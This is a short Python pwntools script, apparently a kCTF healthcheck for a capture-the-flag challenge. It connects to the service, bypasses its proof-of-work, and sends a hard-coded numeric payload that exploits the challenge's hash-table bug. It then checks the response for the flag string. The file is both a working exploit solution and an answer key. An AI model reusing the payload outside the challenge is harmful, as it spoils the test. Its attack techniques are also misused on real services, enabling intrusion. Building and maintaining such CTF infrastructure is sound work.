#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.



import pwnlib.tubes
import argparse

def handle_pow(r):
    r.recvuntil(b'python3 ')
    r.recvuntil(b' solve ')
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    r.recvuntil(b'Correct\n')

    
def check_solve(r):
    payload = "2 22296949541 2 395741000485 2 1122999759653 2 1617776636709 2 1769056793381 2 1798148485925 2 1864955360037 2 1984274920229 2 1993737270053 2 2181625312037 2 2197563667237 2 2238365856549 2 2325355721509 2 2769180193573 2 3332642992933 2 3892381250341 2 4261865878309 2 4303154606885 2 4329528390437 2 4453612679973 2 4809910416165 2 5130472682277 2 5457427067685 2 5636205081381 2 5880447791909 2 5891990516517 2 6610961330981 2 7138571219749 2 7156824830757 2 7300622349093 2 7359728481061 2 7364811977509 2 7877775356709 2 7907974345509 2 7922453082917 2 8411089498917 2 8442496447269 2 9011596391205 1\n"
    r.sendline(payload.encode())
    r.recvuntil(b'sure heres the flag')
    response = r.recvuntil(b'QQQQQQQ')
    return b'ictf{br0k3n_l1n34r_pr0b1n6+p4713nc3->574ck_4v4l4nch3+l337_fl465' in response

    
    
    
def main(address,port):
    conn = pwnlib.tubes.remote.remote(address,port)
    pow_statement = conn.recvuntil([b'proof-of-work: ',b'to leave a number)',])

    if b'proof-of-work' in pow_statement and conn.recvline().startswith(b'enabled'):
        handle_pow(conn)

    if not check_solve(conn):
        exit(1)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="address and port to use, default is localhost and 1337.")
    parser.add_argument("--address", "-a", type=str, default="localhost", help="address to use")
    parser.add_argument("--port", "-p", type=int, default=1337, help="port to use")
    args = parser.parse_args()
    main(args.address,args.port)

